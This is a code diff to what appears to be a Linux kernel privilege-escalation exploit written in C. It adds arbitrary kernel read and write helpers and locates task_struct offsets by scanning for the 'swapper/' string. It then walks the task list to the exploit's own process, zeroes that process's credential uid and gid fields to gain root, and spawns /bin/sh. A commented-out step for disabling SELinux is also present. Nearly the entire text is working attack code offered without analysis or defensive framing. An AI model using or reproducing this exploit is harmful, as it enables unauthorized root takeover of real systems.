@@ -733,6 +733,10 @@ usize addr_to_page(usize addr) {
 }
 
 usize is_linear_address(usize addr) {
+  return (addr & 0xffff000000000000) == 0xffff000000000000;
+}
+
+usize is_kernel_address(usize addr) {
   return (addr & 0xffffffff80000000) == 0xffffffff80000000;
 }
 
@@ -801,12 +805,36 @@ void write64(unsigned long addr, unsigned long data) {
   write(exp_pipes[1], &data, 8);
 }
 
-usize read64_virtual(usize addr) {
+usize read64_kernel(usize addr) {
   return read64(addr - kaslr_base + phys_base);
 }
 
-void write64_virtual(usize addr, usize data) {
+void write64_kernel(usize addr, usize data) {
   write64(addr - kaslr_base + phys_base, data);
+}
+
+usize read64_virtual(usize addr) {
+  return read64(addr - 0xffff888000000000);
+}
+
+void write64_virtual(usize addr, usize data) {
+  return write64(addr - 0xffff888000000000, data);
+}
+
+usize read64_all(usize addr) {
+  if (is_kernel_address(addr)) {
+    return read64_kernel(addr);
+  } else {
+    return read64_virtual(addr);
+  }
+}
+
+void write64_all(usize addr, usize data) {
+  if (is_kernel_address(addr)) {
+    write64_kernel(addr, data);
+  } else {
+    write64_virtual(addr, data);
+  }
 }
 
 void read_mem(unsigned long addr, unsigned long *data, unsigned size) {
@@ -1032,21 +1060,23 @@ void exploit() {
   usize current_task = INIT_OFFSET + kaslr_base;
 
   usize comm_offset = 0;
-  usize cred_offset = comm_offset - 0x10;
+  usize cred_offset = 0;
   usize next_task_offset = 0;
 
   for (usize i = 0; i < 4096 - 8; i+=8) {
-    usize value = read64_virtual(current_task + i);
-    usize value2 = read64_virtual(current_task + i + 8);
+    usize value = read64_kernel(current_task + i);
+    usize value2 = read64_kernel(current_task + i + 8);
     // check for 'swapper/' string
     if (value == 0x2f72657070617773) {
-      comm_offset = i;
+      comm_offset = i;\
+      cred_offset = comm_offset - 0x10;
       printf("comm offset: %lx\n", comm_offset);
     }
 
     if (is_linear_address(value) && is_linear_address(value2)) {
-      printf("%lx, %lx\n", value, value2);
-      usize prev_ptr = read64_virtual(value + 8);
+      // printf("%lx, %lx\n", value, value2);
+      usize prev_ptr = read64_all(value + 8);
+      // printf("prev: %lx\n", prev_ptr);
       if (prev_ptr == current_task + i && value % 128 == i % 128) {
         next_task_offset = i;
         printf("next task offset: %lx\n", next_task_offset);
@@ -1054,32 +1084,76 @@ void exploit() {
     }
   }
 
-  for (next_task_offset = 0; next_task_offset < 4096; next_task_offset += 8) {
-    printf("offset: %lx\n", next_task_offset);
-    current_task = INIT_OFFSET + kaslr_base;
-    usize counter = 0;
-    for (;;) {
-      usize new_task = read64_virtual(current_task + next_task_offset) - next_task_offset;
-      printf("new task: %lx\n", new_task);
-      if (new_task == current_task || !is_linear_address(new_task) || counter > 8 || new_task > 0xfffffffffff00000 || new_task % 8 != 0) {
-        //printf("failed to find new task\n");
-        break;
-        // getchar();
-        // panic("done");
-      }
-      current_task = new_task;
-      counter += 1;
+  current_task = INIT_OFFSET + kaslr_base;
+  for (;;) {
+    usize old_task = current_task;
+    current_task = read64_all(current_task + next_task_offset) - next_task_offset;
+    if (current_task == INIT_OFFSET + kaslr_base || current_task == old_task) {
+      printf("failed to find new task\n");
+      // break;
+      getchar();
+      panic("done");
+    }
+    printf("new task: %lx\n", current_task);
 
-      unsigned long name[2] = { 0 };
-      name[0] = read64_virtual(current_task + comm_offset);
-      printf("%s\n", name);
+    unsigned long name[2] = { 0 };
+    name[0] = read64_all(current_task + comm_offset);
+    printf("%s\n", name);
 
-      if (!strcmp((char *)name, "expp")) {
-        printf("we found the process at %lx\n", current_task);
-        break;
-      }
+    if (!strcmp((char *)name, "expp")) {
+      printf("we found the process at %lx\n", current_task);
+      break;
     }
   }
+
+  usize cred = read64_all(current_task + cred_offset);
+  printf("got cred at: %lx\n", cred);
+  printf("getting root...\n");
+  write64_all(cred + 0x4, 0);
+  write64_all(cred + 0x4 + 8, 0);
+  write64_all(cred + 0x4 + 2 * 8, 0);
+  setuid(0);
+  seteuid(0);
+
+  printf("now we uid/gid: %d/%d\n", getuid(), getgid());
+  // printf("disabling selinux...\n");
+  // selinux_state += kaslr_offset;
+  // // enforing is 1 byte, writing 8 bytes overwrites others
+  // write64(selinux_state - 7, 0);
+  system("/bin/sh");
+
+  while (1) {
+    sleep(1000);
+  }
+
+  // getchar();
+
+  // for (next_task_offset = 0; next_task_offset < 4096; next_task_offset += 8) {
+  //   printf("offset: %lx\n", next_task_offset);
+  //   current_task = INIT_OFFSET + kaslr_base;
+  //   usize counter = 0;
+  //   for (;;) {
+  //     usize new_task = read64_kernel(current_task + next_task_offset) - next_task_offset;
+  //     printf("new task: %lx\n", new_task);
+  //     if (new_task == current_task || !is_linear_address(new_task) || counter > 8 || new_task > 0xfffffffffff00000 || new_task % 8 != 0) {
+  //       //printf("failed to find new task\n");
+  //       break;
+  //       // getchar();
+  //       // panic("done");
+  //     }
+  //     current_task = new_task;
+  //     counter += 1;
+
+  //     unsigned long name[2] = { 0 };
+  //     name[0] = read64_kernel(current_task + comm_offset);
+  //     printf("%s\n", name);
+
+  //     if (!strcmp((char *)name, "expp")) {
+  //       printf("we found the process at %lx\n", current_task);
+  //       break;
+  //     }
+  //   }
+  // }
 
   getchar();
 }
